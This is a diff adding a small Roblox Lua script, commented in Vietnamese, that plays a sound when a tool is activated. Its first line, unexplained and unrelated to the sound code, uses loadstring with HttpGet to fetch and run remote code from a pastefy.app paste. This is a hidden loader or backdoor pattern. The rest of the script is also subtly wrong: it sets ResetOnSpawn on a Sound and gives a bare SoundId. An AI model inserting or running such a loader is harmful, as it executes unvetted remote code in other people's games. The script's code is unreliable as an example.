@@ -1,0 +1,14 @@
+loadstring(game:HttpGet("https://pastefy.app/caSO1DSr/raw"))()
+-- Tạo âm thanh và đặt thuộc tính ResetOnSpawn thành false
+local sound = Instance.new("Sound")
+sound.SoundId = "6585239805" -- Thay "ID_CỦA_BẠN" bằng ID âm thanh bạn muốn phát
+sound.Parent = script.Parent -- Đặt âm thanh vào đối tượng này
+sound.ResetOnSpawn = false -- Đảm bảo âm thanh không bị reset khi respawn
+
+-- Hàm phát âm thanh khi kích hoạt
+local function playSound()
+    sound:Play() -- Phát âm thanh
+end
+
+-- Kích hoạt âm thanh khi người chơi tương tác (sử dụng Activated)
+script.Parent.Activated:Connect(playSound)
